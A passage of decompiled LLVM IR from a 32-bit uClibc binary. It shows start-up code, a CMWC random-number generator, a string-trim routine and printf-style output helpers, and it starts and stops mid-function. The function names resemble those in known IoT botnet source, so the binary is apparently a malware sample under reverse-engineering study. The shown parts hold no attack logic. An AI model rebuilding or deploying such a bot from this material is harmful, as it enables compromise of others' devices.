  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8059124.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8059124.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8059124.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805a140.1, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8059124.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805a140.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_80580e4.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_80590f8.6, align 8
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v8_8048180 = inttoptr i32 %arg1 to i32*
  %v9_8048180 = call i32 @__uClibc_main(i32 134532123, i32* %v8_8048180, i32 %v4_8048166, i32 134512788, i32 134562888, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805a180.7, align 128
  %v1_8048199 = add i32 %arg1, -1640531527
  store i32 %v1_8048199, i32* @global_var_805a184.8, align 4
  %v1_80481a6 = add i32 %arg1, 1013904242
  store i32 %v1_80481a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80481a6, i32* @global_var_805a188.9, align 8
  br label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %entry, %dec_label_pc_80481b9
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481e9, %dec_label_pc_80481b9 ]
  %v1_80481bf = add nsw i32 %storemerge5, -3
  store i32 %v1_80481bf, i32* %eax.global-to-local, align 4
  %v1_80481c2 = mul nuw nsw i32 %v1_80481bf, 4
  %v2_80481c2 = add i32 %v1_80481c2, ptrtoint (i32* @global_var_805a180.7 to i32)
  %v3_80481c2 = inttoptr i32 %v2_80481c2 to i32*
  %v4_80481c2 = load i32, i32* %v3_80481c2, align 4
  %v1_80481cc = add nsw i32 %storemerge5, -2
  store i32 %v1_80481cc, i32* %eax.global-to-local, align 4
  %v1_80481cf = mul nuw nsw i32 %v1_80481cc, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint (i32* @global_var_805a180.7 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v2_80481d6 = xor i32 %v4_80481cf, %v4_80481c2
  %v2_80481db = xor i32 %storemerge5, -1640531527
  %v1_80481dd = xor i32 %v2_80481db, %v2_80481d6
  store i32 %v1_80481dd, i32* %eax.global-to-local, align 4
  %v2_80481e2 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e2 = add i32 %v2_80481e2, ptrtoint (i32* @global_var_805a180.7 to i32)
  %v4_80481e2 = inttoptr i32 %v3_80481e2 to i32*
  store i32 %v1_80481dd, i32* %v4_80481e2, align 4
  %v4_80481e9 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481e9, 4096
  br i1 %exitcond, label %dec_label_pc_80481f5, label %dec_label_pc_80481b9

dec_label_pc_80481f5:                             ; preds = %dec_label_pc_80481b9
  %v0_80481f6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481f6

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481b9, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048213 = load i32, i32* @global_var_8059eb0.10, align 16
  %v1_8048218 = add i32 %v0_8048213, 1
  %v1_8048219 = urem i32 %v1_8048218, 4096
  store i32 %v1_8048219, i32* @global_var_8059eb0.10, align 16
  %v1_8048228 = mul nuw nsw i32 %v1_8048219, 4
  %v2_8048228 = add i32 %v1_8048228, ptrtoint (i32* @global_var_805a180.7 to i32)
  %v3_8048228 = inttoptr i32 %v2_8048228 to i32*
  %v4_8048228 = load i32, i32* %v3_8048228, align 4
  %v7_8048245 = udiv i32 %v4_8048228, 228675
  store i32 %v7_8048245, i32* @global_var_8059eac.11, align 4
  br i1 true, label %dec_label_pc_8048295, label %dec_label_pc_8048287

dec_label_pc_8048287:                             ; preds = %entry
  br label %dec_label_pc_8048295

dec_label_pc_8048295:                             ; preds = %entry, %dec_label_pc_8048287
  store i32 %v1_8048219, i32* @ecx, align 4
  %v1_80482aa = mul nuw nsw i32 %v1_8048219, 4
  %v2_80482aa = add i32 %v1_80482aa, ptrtoint (i32* @global_var_805a180.7 to i32)
  %v3_80482aa = inttoptr i32 %v2_80482aa to i32*
  %v4_80482aa = load i32, i32* %v3_80482aa, align 4
  ret i32 %v4_80482aa

; uselistorder directives
  uselistorder i32 %v1_8048219, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048295, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80482ba = load i32, i32* @edi, align 4
  store i32 %v0_80482ba, i32* %stack_var_-8, align 4
  %v4_80482c5 = ptrtoint i8* %tmp10 to i32
  store i1 false, i1* @df, align 1
  %v3_80482d6 = call i32 @_strlen(i8* %tmp10)
  %v1_80482dd = add i32 %v3_80482d6, -1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e6
  %v4_80482e3 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e6:                             ; preds = %entry, %dec_label_pc_80482e3
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e3, %dec_label_pc_80482e3 ]
  %v6_80482e9 = add i32 %stack_var_-16.0, %v4_80482c5
  %v1_80482ec = inttoptr i32 %v6_80482e9 to i8*
  %v2_80482ec = load i8, i8* %v1_80482ec, align 1
  %v2_80482ee = sext i8 %v2_80482ec to i32
  %v1_80482f5 = call i32 @isspace(i32 %v2_80482ee)
  %v1_80482fd = icmp eq i32 %v1_80482f5, 0
  %v1_80482ff = icmp eq i1 %v1_80482fd, false
  br i1 %v1_80482ff, label %dec_label_pc_80482e3, label %dec_label_pc_8048306.preheader

dec_label_pc_8048306.preheader:                   ; preds = %dec_label_pc_80482e6
  %v5_804830c24 = icmp slt i32 %v1_80482dd, %stack_var_-16.0
  br i1 %v5_804830c24, label %dec_label_pc_8048329, label %dec_label_pc_804830e.lr.ph

dec_label_pc_804830e.lr.ph:                       ; preds = %dec_label_pc_8048306.preheader
  br label %dec_label_pc_804830e

dec_label_pc_8048303:                             ; preds = %dec_label_pc_804830e
  %v5_8048303 = add i32 %stack_var_-12.0.in25, -1
  %v5_804830c = icmp slt i32 %v5_8048303, %stack_var_-16.0
  br i1 %v5_804830c, label %dec_label_pc_8048329, label %dec_label_pc_804830e

dec_label_pc_804830e:                             ; preds = %dec_label_pc_804830e.lr.ph, %dec_label_pc_8048303
  %stack_var_-12.0.in25 = phi i32 [ %v1_80482dd, %dec_label_pc_804830e.lr.ph ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v6_8048311 = add i32 %stack_var_-12.0.in25, %v4_80482c5
  %v1_8048314 = inttoptr i32 %v6_8048311 to i8*
  %v2_8048314 = load i8, i8* %v1_8048314, align 1
  %v2_8048316 = sext i8 %v2_8048314 to i32
  %v1_804831d = call i32 @isspace(i32 %v2_8048316)
  %v1_8048325 = icmp eq i32 %v1_804831d, 0
  %v1_8048327 = icmp eq i1 %v1_8048325, false
  br i1 %v1_8048327, label %dec_label_pc_8048303, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048303, %dec_label_pc_804830e, %dec_label_pc_8048306.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80482dd, %dec_label_pc_8048306.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_804830e ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v7_804835118 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  br i1 %v7_804835118, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_8048329, %dec_label_pc_8048331
  %v6_804835b20 = phi i32 [ %v6_804835b, %dec_label_pc_8048331 ], [ %v4_80482c5, %dec_label_pc_8048329 ]
  %storemerge.in19 = phi i32 [ %v5_8048348, %dec_label_pc_8048331 ], [ %stack_var_-16.0, %dec_label_pc_8048329 ]
  %v6_8048341 = add i32 %storemerge.in19, %v4_80482c5
  %v1_8048344 = inttoptr i32 %v6_8048341 to i8*
  %v2_8048344 = load i8, i8* %v1_8048344, align 1
  %v3_8048346 = inttoptr i32 %v6_804835b20 to i8*
  store i8 %v2_8048344, i8* %v3_8048346, align 1
  %v5_8048348 = add i32 %storemerge.in19, 1
  %v7_8048351 = icmp sgt i32 %v5_8048348, %stack_var_-12.0.in.lcssa
  %v2_8048359 = sub i32 %v5_8048348, %stack_var_-16.0
  %v6_804835b = add i32 %v2_8048359, %v4_80482c5
  br i1 %v7_8048351, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048353:                             ; preds = %dec_label_pc_8048331, %dec_label_pc_8048329
  %v6_804835b.lcssa = phi i32 [ %v4_80482c5, %dec_label_pc_8048329 ], [ %v6_804835b, %dec_label_pc_8048331 ]
  %v22_804835b = inttoptr i32 %v6_804835b.lcssa to i8*
  store i8 0, i8* %v22_804835b, align 1
  %v3_8048361 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048361, i32* @edi, align 4
  ret i32 %v6_804835b.lcssa

; uselistorder directives
  uselistorder i32 %v6_804835b.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048348, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_8048303, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_80482dd, { 2, 1, 0 }
  uselistorder i32 %v4_80482c5, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8048331, { 1, 0 }
  uselistorder label %dec_label_pc_8048329, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830e, { 1, 0 }
  uselistorder label %dec_label_pc_80482e6, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_804839e

dec_label_pc_804838b:                             ; preds = %entry
  %v3_8048396 = bitcast i8* %stack_var_8 to i32*
  %v4_8048396 = call i32 @__libc_write(i32 1, i32* %v3_8048396, i32 1)
  br label %dec_label_pc_804839e

dec_label_pc_804839e:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_804839f = phi i32 [ %tmp3, %dec_label_pc_8048372 ], [ %v4_8048396, %dec_label_pc_804838b ]
  ret i32 %v0_804839f

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804839e, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp24 = icmp slt i32 %arg3, 1
  br i1 %tmp24, label %dec_label_pc_8048400, label %dec_label_pc_80483ba

dec_label_pc_80483ba:                             ; preds = %entry
  %v4_80483c1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c1, i32* @edx, align 4
  %v2_80483d255 = load i8, i8* %arg2, align 1
  %v3_80483d256 = zext i8 %v2_80483d255 to i32
  %v5_80483d257 = and i32 %v4_80483c1, -256
  %v6_80483d258 = or i32 %v3_80483d256, %v5_80483d257
  %v4_80483d459 = icmp eq i8 %v2_80483d255, 0
  %v1_80483d660 = icmp eq i1 %v4_80483d459, false
  br i1 %v1_80483d660, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483c9:                             ; preds = %dec_label_pc_80483ba, %dec_label_pc_80483c9
  %v6_80483d263 = phi i32 [ %v6_80483d2, %dec_label_pc_80483c9 ], [ %v6_80483d258, %dec_label_pc_80483ba ]
  %v4_80483cf62 = phi i32 [ %v5_80483cc, %dec_label_pc_80483c9 ], [ %v4_80483c1, %dec_label_pc_80483ba ]
  %stack_var_-12.061 = phi i32 [ %v4_80483c9, %dec_label_pc_80483c9 ], [ 0, %dec_label_pc_80483ba ]
  %v4_80483c9 = add i32 %stack_var_-12.061, 1
  %v5_80483cc = add i32 %v4_80483cf62, 1
  %v22_80483cc = inttoptr i32 %v5_80483cc to i8*
  store i32 %v5_80483cc, i32* @edx, align 4
  %v2_80483d2 = load i8, i8* %v22_80483cc, align 1
  %v3_80483d2 = zext i8 %v2_80483d2 to i32
  %v5_80483d2 = and i32 %v6_80483d263, -256
  %v6_80483d2 = or i32 %v3_80483d2, %v5_80483d2
  %v4_80483d4 = icmp eq i8 %v2_80483d2, 0
  %v1_80483d6 = icmp eq i1 %v4_80483d4, false
  br i1 %v1_80483d6, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483d8:                             ; preds = %dec_label_pc_80483c9, %dec_label_pc_80483ba
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483ba ], [ %v4_80483c9, %dec_label_pc_80483c9 ]
  %v5_80483de = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483de, label %dec_label_pc_80483e9, label %dec_label_pc_80483ef

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_80483d8
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483ec = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483d8, %dec_label_pc_80483e9
  %storemerge = phi i32 [ %v5_80483ec, %dec_label_pc_80483e9 ], [ 0, %dec_label_pc_80483d8 ]
  %v1_80483f2 = and i32 %arg4, 2
  %tmp25 = mul nuw nsw i32 %v1_80483f2, 8
  %tmp26 = or i32 %tmp25, 32
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483ef, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483ef ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp26, %dec_label_pc_80483ef ]
  %v1_8048403 = urem i32 %arg4, 2
  %v2_8048403 = icmp eq i32 %v1_8048403, 0
  %v1_8048408 = icmp eq i1 %v2_8048403, false
  %.pre10 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048408, label %dec_label_pc_804844a.preheader, label %dec_label_pc_8048423.preheader

dec_label_pc_8048423.preheader:                   ; preds = %dec_label_pc_8048400
  %tmp2748 = icmp slt i32 %stack_var_12.0, 1
  %tmp2849 = icmp eq i1 %tmp2748, false
  br i1 %tmp2849, label %dec_label_pc_804840c.lr.ph, label %dec_label_pc_804844a.preheader

dec_label_pc_804840c.lr.ph:                       ; preds = %dec_label_pc_8048423.preheader
  br label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_804840c.lr.ph, %dec_label_pc_804840c
  %stack_var_-20.051 = phi i32 [ 0, %dec_label_pc_804840c.lr.ph ], [ %v4_804841d, %dec_label_pc_804840c ]
  %stack_var_12.150 = phi i32 [ %stack_var_12.0, %dec_label_pc_804840c.lr.ph ], [ %v4_8048420, %dec_label_pc_804840c ]
  %v3_8048415 = call i32 @printchar(i32* %.pre10, i32 %stack_var_-16.0)
  %v4_804841d = add i32 %stack_var_-20.051, 1
  %v4_8048420 = add i32 %stack_var_12.150, -1
  %tmp27 = icmp slt i32 %v4_8048420, 1
  %tmp28 = icmp eq i1 %tmp27, false
  br i1 %tmp28, label %dec_label_pc_804840c, label %dec_label_pc_804844a.preheader

dec_label_pc_804844a.preheader:                   ; preds = %dec_label_pc_8048423.preheader, %dec_label_pc_804840c, %dec_label_pc_8048400
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048400 ], [ %stack_var_12.0, %dec_label_pc_8048423.preheader ], [ %v4_8048420, %dec_label_pc_804840c ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_8048423.preheader ], [ %v4_804841d, %dec_label_pc_804840c ]
  %v2_804844d37 = load i8, i8* %arg2, align 1
  %v4_804844f41 = icmp eq i8 %v2_804844d37, 0
  %v1_804845142 = icmp eq i1 %v4_804844f41, false
  br i1 %v1_804845142, label %dec_label_pc_804842b.lr.ph, label %dec_label_pc_804846c.preheader

dec_label_pc_804842b.lr.ph:                       ; preds = %dec_label_pc_804844a.preheader
  %v4_804844a36 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804842b

dec_label_pc_804842b:                             ; preds = %dec_label_pc_804842b.lr.ph, %dec_label_pc_804842b
  %v4_804844a45 = phi i32 [ %v4_804844a36, %dec_label_pc_804842b.lr.ph ], [ %v5_8048447, %dec_label_pc_804842b ]
  %stack_var_-20.144 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804842b.lr.ph ], [ %v4_8048444, %dec_label_pc_804842b ]
  %stack_var_8.043 = phi i8* [ %arg2, %dec_label_pc_804842b.lr.ph ], [ %v22_8048447, %dec_label_pc_804842b ]
  %v2_804842e = load i8, i8* %stack_var_8.043, align 1
  %v3_804842e = zext i8 %v2_804842e to i32
  %v3_804843c = call i32 @printchar(i32* %.pre10, i32 %v3_804842e)
  %v4_8048444 = add i32 %stack_var_-20.144, 1
  %v5_8048447 = add i32 %v4_804844a45, 1
  %v22_8048447 = inttoptr i32 %v5_8048447 to i8*
  %v2_804844d = load i8, i8* %v22_8048447, align 1
  %v4_804844f = icmp eq i8 %v2_804844d, 0
  %v1_8048451 = icmp eq i1 %v4_804844f, false
  br i1 %v1_8048451, label %dec_label_pc_804842b, label %dec_label_pc_804846c.preheader

dec_label_pc_804846c.preheader:                   ; preds = %dec_label_pc_804842b, %dec_label_pc_804844a.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804844a.preheader ], [ %v4_8048444, %dec_label_pc_804842b ]
  %tmp2932 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3033 = icmp eq i1 %tmp2932, false
  br i1 %tmp3033, label %dec_label_pc_8048455.lr.ph, label %dec_label_pc_8048472

dec_label_pc_8048455.lr.ph:                       ; preds = %dec_label_pc_804846c.preheader
  br label %dec_label_pc_8048455

dec_label_pc_8048455:                             ; preds = %dec_label_pc_8048455.lr.ph, %dec_label_pc_8048455
  %stack_var_-20.235 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048455.lr.ph ], [ %v4_8048466, %dec_label_pc_8048455 ]
  %stack_var_12.334 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_8048455.lr.ph ], [ %v4_8048469, %dec_label_pc_8048455 ]
  %v3_804845e = call i32 @printchar(i32* %.pre10, i32 %stack_var_-16.0)
  %v4_8048466 = add i32 %stack_var_-20.235, 1
  %v4_8048469 = add i32 %stack_var_12.334, -1
  %tmp29 = icmp slt i32 %v4_8048469, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_8048455, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804846c.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804846c.preheader ], [ %v4_8048466, %dec_label_pc_8048455 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048447, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483cc, { 1, 2, 0 }
  uselistorder i32 %v4_80483c1, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8048455, { 1, 0 }
  uselistorder label %dec_label_pc_804842b, { 1, 0 }
  uselistorder label %dec_label_pc_804844a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804840c, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
  uselistorder label %dec_label_pc_80483c9, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804848e = sext i32 %tmp35 to i64
  %v4_8048491 = icmp eq i32 %tmp35, 0
  %v5_8048491 = icmp slt i32 %tmp35, 0
  %v1_8048495 = icmp eq i1 %v4_8048491, false
  br i1 %v1_8048495, label %dec_label_pc_80484bc, label %dec_label_pc_8048497

dec_label_pc_8048497:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484ac = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048597

dec_label_pc_80484bc:                             ; preds = %entry
  %v4_80484bc = icmp eq i32 %tmp28, 0
  br i1 %v4_80484bc, label %dec_label_pc_80484dd, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_80484bc
  %v12_80484c2 = icmp eq i32 %tmp27, 10
  %v1_80484c6 = icmp eq i1 %v12_80484c2, false
  br i1 %v1_80484c6, label %dec_label_pc_80484dd, label %dec_label_pc_80484c8

dec_label_pc_80484c8:                             ; preds = %dec_label_pc_80484c2
  %v1_80484cc = icmp eq i1 %v5_8048491, false
  br i1 %v1_80484cc, label %dec_label_pc_80484dd, label %dec_label_pc_80484ce

dec_label_pc_80484ce:                             ; preds = %dec_label_pc_80484c8
  %v1_80484d8 = sub i32 0, %tmp35
  %v5_80484da = sext i32 %v1_80484d8 to i64
  br label %dec_label_pc_80484dd

dec_label_pc_80484dd:                             ; preds = %dec_label_pc_80484c8, %dec_label_pc_80484c2, %dec_label_pc_80484bc, %dec_label_pc_80484ce
  %stack_var_-24.0 = phi i64 [ %v5_804848e, %dec_label_pc_80484bc ], [ %v5_804848e, %dec_label_pc_80484c2 ], [ %v5_804848e, %dec_label_pc_80484c8 ], [ %v5_80484da, %dec_label_pc_80484ce ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484bc ], [ 0, %dec_label_pc_80484c2 ], [ 0, %dec_label_pc_80484c8 ], [ 1, %dec_label_pc_80484ce ]
  %v15_80484e0 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804853e7 = trunc i64 %stack_var_-24.0 to i32
  %v5_804853e8 = icmp eq i32 %v4_804853e7, 0
  %v1_804854215 = icmp eq i1 %v5_804853e8, false
  br i1 %v1_804854215, label %dec_label_pc_80484ee.lr.ph, label %dec_label_pc_8048544

dec_label_pc_80484ee.lr.ph:                       ; preds = %dec_label_pc_80484dd
  %v5_80484f1 = sext i32 %tmp27 to i64
  br label %dec_label_pc_80484ee

dec_label_pc_80484ee:                             ; preds = %dec_label_pc_80484ee.lr.ph, %dec_label_pc_8048516
  %v3_804851618 = phi i8* [ %tmp48, %dec_label_pc_80484ee.lr.ph ], [ %v22_8048516, %dec_label_pc_8048516 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80484ee.lr.ph ], [ %v5_804853b, %dec_label_pc_8048516 ]
  %v6_80484fc = and i64 %stack_var_-24.116, 4294967295
  %v12_80484fc = udiv i64 %v6_80484fc, %v5_80484f1
  %v13_80484fc = trunc i64 %v12_80484fc to i32
  %v14_80484fc = urem i64 %v6_80484fc, %v5_80484f1
  %v5_8048501 = trunc i64 %v14_80484fc to i8
  %v7_8048508 = icmp sgt i8 %v5_8048501, 9
  br i1 %v7_8048508, label %dec_label_pc_804850a, label %dec_label_pc_8048516

dec_label_pc_804850a:                             ; preds = %dec_label_pc_80484ee
  %tmp52 = trunc i64 %v14_80484fc to i32
  %v5_804850d = add i32 %tmp52, %tmp
  %v1_8048510 = add i32 %v5_804850d, 198
  %v11_8048510 = trunc i32 %v1_8048510 to i8
  br label %dec_label_pc_8048516

dec_label_pc_8048516:                             ; preds = %dec_label_pc_80484ee, %dec_label_pc_804850a
  %stack_var_-36.0 = phi i8 [ %v11_8048510, %dec_label_pc_804850a ], [ %v5_8048501, %dec_label_pc_80484ee ]
  %v4_8048516 = ptrtoint i8* %v3_804851618 to i32
  %v5_8048516 = add i32 %v4_8048516, -1
